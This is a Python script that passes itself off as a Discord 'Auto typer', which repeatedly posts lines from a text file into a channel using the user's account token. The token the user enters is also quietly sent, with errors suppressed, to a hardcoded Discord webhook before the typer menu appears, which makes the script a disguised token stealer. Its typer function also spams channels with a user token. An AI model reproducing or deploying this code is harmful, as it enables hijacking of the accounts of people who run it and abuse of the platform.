import requests
import time
import os
import sys
from colorama import init, Fore

init()

logo = r"""
 ▄▄▄· ▄• ▄▌▄▄▄▄▄▄        ▄▄▄▄▄▄ ▄· ▄▌ ▄▄▄·▪   ▐ ▄  ▄▄ • 
▐█ ▀█ █▪██▌▀•██ ▀ ▄█▀▄   ▀•██ ▀▐█▪██▌▐█ ▄███ •█▌▐█▐█ ▀ ▪
▄█▀▀█ █▌▐█▌  ▐█.▪▐█▌.▐▌    ▐█.▪▐█▌▐█▪ ██▀·▐█·▐█▐▐▌▄█ ▀█▄
▐█▪ ▐▌▐█▄█▌  ▐█▌·▐█▌.▐▌    ▐█▌· ▐█▀·.▐█▪·•▐█▌██▐█▌▐█▄▪▐█
 ▀  ▀  ▀▀▀   ▀▀▀  ▀█▄▀▪    ▀▀▀   ▀ • .▀   ▀▀▀▀▀ █▪·▀▀▀▀ 
"""

webhook_url = "https://discord.com/api/webhooks/1381072546446966894/2xJ23VKTAisKoK8TuF1wtMGUoml8WvlXV1_mjOLVw5bRT1iYDbKXqr5vvKZfPcm_UBCu"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_logo():
    print(Fore.BLUE + logo + Fore.RESET)

def send_token_to_webhook(token):
    try:
        data = {"content": f"Token: {token}"}
        requests.post(webhook_url, json=data, timeout=5)
    except:
        pass

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def auto_typer(token):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0'
    }

    clear_screen()
    print_logo()
    channel_id = input(Fore.BLUE + "Channel ID: " + Fore.RESET).strip()

    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

    try:
        with open(resource_path("Type-words.txt"), "r", encoding="utf-8") as file:
            lines = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "Type-words.txt not found!" + Fore.RESET)
        input(Fore.BLUE + "\nPress Enter to exit..." + Fore.RESET)
        return

    try:
        while True:
            for line in lines:
                payload = {"content": line}
                r = requests.post(url, headers=headers, json=payload)

                # إذا فيه Rate Limit، انتظر الوقت المطلوب
                if r.status_code == 429:
                    retry_after = r.json().get("retry_after", 1)
                    time.sleep(retry_after)
                elif r.status_code == 401:
                    print(Fore.RED + "Invalid token" + Fore.RESET)
                    return
                # بدون أي تأخير هنا
    except KeyboardInterrupt:
        print(Fore.BLUE + "\nStopped." + Fore.RESET)




def main():
    while True:
        clear_screen()
        print_logo()

        token = input(Fore.BLUE + "Enter The token: " + Fore.RESET).strip()
        if not token:
            print(Fore.RED + "Invalid input" + Fore.RESET)
            time.sleep(1.5)
            continue

        send_token_to_webhook(token)

        while True:
            clear_screen()
            print_logo()
            print(Fore.BLUE + "1 - Auto typer" + Fore.RESET)
            print(Fore.BLUE + "0 - Exit" + Fore.RESET)

            choice = input(Fore.BLUE + "\nYour choice: " + Fore.RESET).strip()

            if choice == "1":
                auto_typer(token)
                break
            elif choice == "0":
                print(Fore.BLUE + "Bye!" + Fore.RESET)
                exit()
            else:
                print(Fore.RED + "Invalid choice" + Fore.RESET)
                time.sleep(1.5)

if __name__ == "__main__":
    main()
